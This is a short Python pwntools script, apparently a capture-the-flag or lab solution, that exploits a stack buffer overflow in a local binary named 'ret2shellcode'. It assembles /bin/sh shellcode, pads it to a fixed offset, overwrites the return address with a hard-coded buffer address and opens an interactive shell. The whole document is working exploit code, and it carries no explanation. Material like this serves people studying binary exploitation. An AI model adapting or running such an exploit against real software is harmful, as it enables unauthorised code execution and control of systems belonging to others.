##!/usr/bin/python3
from pwn import *

shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080
offset = 0x6c + 4
print('shellcode length: {}'.format(len(shellcode)))
shellcode_pad = shellcode + (offset - len(shellcode)) * b'A'

sh = process('./ret2shellcode')
sh.sendline(shellcode_pad + p32(buf2_addr))
sh.interactive()
